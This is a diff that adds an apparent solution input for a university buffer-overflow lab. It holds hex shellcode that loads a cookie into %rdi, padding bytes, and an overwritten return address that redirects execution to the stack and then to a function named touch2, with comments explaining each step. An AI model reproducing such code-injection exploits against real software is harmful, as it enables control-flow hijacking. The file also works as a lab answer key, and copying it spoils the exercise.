@@ -1,0 +1,26 @@
+ /* getbuf function preserves a 40 bytes buffer */
+ /* use our new write_cookie code to fill the buffer */
+
+48 c7 c7 77 1c c1 3c /* movq $0x3cc11c77 , %rdi */
+c3                   /* ret */
+
+/* use gdb to know that when enter the getbuf function, */
+/* the rsp is 0x5563d170 */
+/* so the buffer starts from 0x5563d170 - 0x28 = 0x5563d148 */
+/* then we need to make our code jump to 0x5563d148 to execute our code */
+/* to meet the requirement of lab, change ret address to 0x5563d148 */
+
+/* filling remain buffer space */
+38 39
+30 31 32 33 34 35 36 37 38 39
+30 31 32 33 34 35 36 37 38 39
+30 31 32 33 34 35 36 37 38 39
+/* overwrite the return address */
+ 48 d1 63 55 00 00 00 00
+/* fe 89 80 */
+
+/* then we need to jump our code to touch2 function */
+/* so that we pass cookie as the argument to touch2 function */
+/* the address of touch2 function is 0x808a2c */
+ fd 89 80 00 00 00 00 00 
+ 2c 8a 80 00 00 00 00 00
